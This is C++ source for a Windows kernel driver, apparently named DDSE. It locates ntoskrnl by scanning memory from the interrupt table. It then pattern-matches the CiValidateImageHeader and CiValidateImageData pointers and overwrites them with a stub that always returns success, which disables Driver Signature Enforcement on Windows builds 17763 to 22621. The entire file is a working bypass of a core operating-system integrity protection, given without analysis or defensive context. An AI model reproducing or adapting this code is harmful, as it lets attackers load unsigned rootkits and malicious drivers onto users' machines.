#include <ntifs.h>

#define InRange(x, a, b) (x >= a && x <= b) 
#define GetBits(x) (InRange(x, '0', '9') ? (x - '0') : ((x - 'A') + 0xA))
#define GetByte(x) ((UCHAR)(GetBits(x[0]) << 4 | GetBits(x[1])))


ULONG64 FindPattern(PVOID Base, SIZE_T Size, PCHAR Pattern)
{
    PUCHAR ModuleStart = (PUCHAR)Base;
    PUCHAR ModuleEnd = (PUCHAR)(ModuleStart + Size);

    PUCHAR FirstMatch = nullptr;
    const char* CurPatt = Pattern;
    for (; ModuleStart < ModuleEnd; ++ModuleStart)
    {
        bool SkiPUCHAR = (*CurPatt == '\?');
        if (SkiPUCHAR || *ModuleStart == GetByte(CurPatt)) {
            if (!FirstMatch) FirstMatch = ModuleStart;
            SkiPUCHAR ? CurPatt += 2 : CurPatt += 3;
            if (CurPatt[-1] == 0) return (ULONG64)FirstMatch;
        }
        else if (FirstMatch) {
            ModuleStart = FirstMatch;
            FirstMatch = nullptr;
            CurPatt = Pattern;
        }
    }
    return NULL;
}

PVOID GetKernelBase()
{
    auto IdtBase = *(ULONG64*)(__readgsqword(0x18) + 0x38);     // x64 kernel mode only
    auto Start = *(ULONG64*)(IdtBase + 4) & 0xFFFFFFFFFFFF0000;
    for (auto Page = (PUCHAR)Start; Page > (PUCHAR)Start - 0xB00000; Page -= 0x1000) {
        for (int i = 0; i < 0xFF9; ++i) {
            if (*(USHORT*)&Page[i] == 0x8D48 && Page[i + 2] == 0x1D && Page[i + 6] == 0xFF) {
                auto KernelBase = &Page[i] + 7 + *(int*)&Page[i + 3];
                if (((ULONG64)KernelBase & 0xFFF) == 0)
                    return KernelBase;
            }
        }
    }
    return NULL;
}

NTSTATUS DisableDSE()
{
    auto ntoskrnl = GetKernelBase();

    // Build 17763~22621
    auto Found = FindPattern(ntoskrnl, 0xB00000, "48 39 35 ? ? ? ? 48 8B F9 48 89 70 F0 44 8B DE");
    if (!Found)
        return STATUS_NOT_FOUND;
    auto pCiValidateImageHeader = Found + *(int*)(Found + 3) + 7;
    auto pCiValidateImageData = pCiValidateImageHeader + 8;

    // mov eax, 1  ret
    // To make CiValidateImage* return NT_SUCCESS value
    auto MovRet = FindPattern(ntoskrnl, 0xB00000, "B8 01 00 00 00 C3");
    
    // Overwrite .data pointer
    *(ULONG64*)pCiValidateImageHeader = MovRet;
    *(ULONG64*)pCiValidateImageData = MovRet;

    return STATUS_SUCCESS;
}

EXTERN_C NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	KdPrint(("[DDSE] DriverEntry\n"));

	DriverObject->DriverUnload = [](PDRIVER_OBJECT DriverObject)->VOID {
		UNREFERENCED_PARAMETER(DriverObject);
	};

    status = DisableDSE();
    if (!NT_SUCCESS(status)) {
        KdPrint(("[DDSE] Disable DSE failed with status: %X\n", status));
        return status;
    }
    KdPrint(("[DDSE] Disable DSE Success!\n"));
    return status;
}
